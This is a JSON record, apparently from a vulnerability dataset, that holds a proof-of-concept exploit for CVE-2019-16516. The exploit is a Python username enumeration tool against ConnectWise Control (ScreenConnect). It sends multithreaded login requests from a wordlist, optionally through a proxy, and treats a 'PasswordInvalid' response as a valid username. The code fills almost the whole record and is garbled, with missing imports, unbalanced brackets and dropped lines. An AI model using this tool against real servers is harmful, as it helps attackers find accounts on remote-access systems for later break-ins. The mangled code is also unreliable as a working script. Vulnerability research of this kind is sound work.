{
    "text": "vul_name : ConnectWise Control 19.2.24707 Username Enumeration ， vul_cve : CVE-2019-16516 ， vul_poc :  # Exploit Title : ConnectWise Control 19.2.24707 - Username Enumeration ，  # Date : 17/12/2021 ，  # Exploit Author : Luca Cuzzolin aka czz78 ，  # Vendor Homepage :  ，  # Version : vulnerable <= 19.2.24707 ，  # CVE : CVE-2019-16516 ， from multiprocessing import Process , Queue ， from statistics import mean ， from urllib3 import exceptions as urlexcept ， HEADER = '\\033 [ 95m' ， OKBLUE = '\\033 [ 94m' ， OKCYAN = '\\033 [ 96m' ， OKGREEN = '\\033 [ 92m' ， WARNING = '\\033 [ 93m' ， FAIL = '\\033 [ 91m' ， ENDC = '\\033 [ 0m' ， BOLD = '\\033 [ 1m' ， UNDERLINE = '\\033 [ 4m' ， headers = [  ]  ， headers.append ( header_line )  ，  # Payload to dictionary ， payload_dict = {} ， split_load = load.split ( \" : \" )  ， payload_dict [ split_load [ 0 ] = split_load [ 1 ]  ， payload_dict [ split_load [ 0 ] = '{USER}' ，  # Enumeration ， total = len ( wordlist )  ， user_payload = dict ( payload_dict )  ， user_payload [ key ] = user ， dataraw = \".join (  [ '%s=%s&' % ( key , value ) for ( key , value ) in user_payload.items (  )  ]  )  [  : -1 ]  ， headers={\"Accept\" : \" * / * \" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"User-Agent\" : \"Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/74.0.3729.169 Safari/537.36\"} ， req = requests.request ( 'POST' , url , headers=headers , data=dataraw , proxies=proxies )  ， x = \".join ( '{} : {}'.format ( k , v ) for k , v in req.headers.items (  )  ， queue.put ( proc_id , \"FOUND\" , user )  ， found_queue.put ( proc_id , \"FOUND\" , user )  ， elif verbose :  ， queue.put ( proc_id , \"TRIED\" , user )  ， queue.put ( \"PERCENT\" , proc_id ,  ( counter/total )  * 100 )  ， print ( \" [ ATTENTION ] Connection error on process {} ! Try lowering the amount of threads with the -c parameter.\".format ( proc_id )  ，  # Arguments ， parser = argparse.ArgumentParser ( description=\" user enumeration tool\" )  ， parser.add_argument ( \"url\" , help=\" ， parser.add_argument ( \"wordlist\" , help=\"username wordlist\" )  ， parser.add_argument ( \"-c\" , metavar=\"cnt\" , type=int , default=10 , help=\"process ( thread ) count , default 10 , too many processes may cause connection problems\" )  ， parser.add_argument ( \"-v\" , action=\"store_true\" , help=\"verbose mode\" )  ， parser.add_argument ( \"-s\" , action=\"store_true\" , help=\"stop on first user found\" )  ， parser.add_argument ( \"-p\" , metavar=\"proxy\" , type=str , help=\"socks4/5 http/https proxy , ex : socks5 : /127.0.0.1 : 9050\" )  ， args = parser.parse_args (  )  ，  # Arguments to simple variables ， wordlist = args.wordlist ， url = args.url ， payload = [ 'ctl00%24Main%24userNameBox : {USER}' , 'ctl00%24Main%24passwordBox : a' , 'ctl00%24Main%24ctl05 : Login' , '_EVENTTARGET : ' , '_EVENTARGUMENT : ' , '_VIEWSTATE : ' ]  ， verbose = args.v ， thread_count = args.c ， failstr = \"PasswordInvalid\" ， stop = args.s ， proxy= args.p ， print ( bcolors.HEADER + \" ， _ _ _ _ ，  |  |  | _ | _ | _ )  | _ | \\ |  |  |  | \\/ |  ，  | _ | _ |  | _ | \\ | _ | \\ |  | _ |  |  |  ， ScreenConnect POC by czz78 :  )  ， \"+ bcolors.ENDC )  ;  ， print ( \"URL : \"+url ) ",
    "time": "2022.01.13"
}